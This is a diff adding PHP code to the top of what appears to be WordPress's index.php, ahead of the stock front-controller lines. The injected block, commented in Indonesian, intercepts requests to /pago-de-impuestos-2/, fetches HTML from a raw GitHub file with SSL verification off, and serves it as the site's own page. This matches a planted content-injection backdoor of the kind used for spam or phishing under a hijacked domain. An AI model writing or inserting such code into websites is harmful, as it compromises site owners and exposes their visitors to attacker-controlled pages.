@@ -1,0 +1,93 @@
+<?php
+/**
+ * Script untuk menampilkan konten dari raw GitHub di path tertentu
+ * Path target: /pago-de-impuestos-2/
+ */
+
+// URL raw konten dari GitHub
+$raw_url = 'https://raw.githubusercontent.com/freyarion25/kw-lp/refs/heads/main/sh-new-lp1.txt';
+
+// Fungsi untuk mengambil konten dari URL
+function get_remote_content($url) {
+    $ch = curl_init();
+    curl_setopt_array($ch, [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_SSL_VERIFYPEER => false,
+        CURLOPT_TIMEOUT => 30,
+        CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; PHP Script)'
+    ]);
+    
+    $content = curl_exec($ch);
+    $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    if ($http_code !== 200) {
+        return false;
+    }
+    
+    return $content;
+}
+
+// Cek apakah request ke path /pago-de-impuestos-2/
+$request_uri = $_SERVER['REQUEST_URI'];
+$target_path = '/pago-de-impuestos-2/';
+
+// Jika path sesuai atau merupakan variasi dari path tersebut
+if (strpos($request_uri, $target_path) === 0 || $request_uri === '/pago-de-impuestos-2') {
+    
+    // Ambil konten dari raw GitHub
+    $html_content = get_remote_content($raw_url);
+    
+    if ($html_content === false) {
+        // Jika gagal mengambil konten, tampilkan error
+        http_response_code(503);
+        echo '<!DOCTYPE html>
+        <html lang="id">
+        <head>
+            <meta charset="UTF-8">
+            <meta name="viewport" content="width=device-width, initial-scale=1.0">
+            <title>Service Temporarily Unavailable</title>
+            <style>
+                body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f5f5f5; }
+                .error-container { background: white; padding: 30px; border-radius: 10px; max-width: 500px; margin: 0 auto; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+                h1 { color: #d32f2f; }
+                p { color: #666; }
+            </style>
+        </head>
+        <body>
+            <div class="error-container">
+                <h1>Service Temporarily Unavailable</h1>
+                <p>Maaf, konten sedang tidak dapat diakses. Silakan coba lagi nanti.</p>
+                <p><small>Error: Unable to fetch content from remote source.</small></p>
+            </div>
+        </body>
+        </html>';
+        exit;
+    }
+    
+    // Set header untuk HTML
+    header('Content-Type: text/html; charset=UTF-8');
+    
+    // Tampilkan konten
+    echo $html_content;
+    exit;
+}
+/**
+ * Front to the WordPress application. This file doesn't do anything, but loads
+ * wp-blog-header.php which does and tells WordPress to load the theme.
+ *
+ * @package WordPress
+ */
+
+/**
+ * Tells WordPress to load the WordPress theme and output it.
+ *
+ * @var bool
+ */
+define( 'WP_USE_THEMES', true );
+
+/** Loads the WordPress Environment and Template */
+require __DIR__ . '/wp-blog-header.php';
+?>
